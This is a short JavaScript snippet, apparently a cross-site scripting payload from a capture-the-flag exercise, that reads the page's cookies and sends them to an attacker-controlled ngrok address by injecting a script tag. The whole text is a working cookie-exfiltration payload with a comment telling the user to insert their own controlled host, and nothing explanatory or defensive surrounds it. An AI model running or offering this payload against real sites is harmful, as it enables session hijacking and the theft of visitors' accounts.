// Set your controlled website as URL
let url = "https://xxxx.ngrok.io"
let flag = encodeURIComponent(document.cookie)
let el = document.createElement("script")
el.src = `${url}/?flag=${flag}`
document.body.appendChild(el)
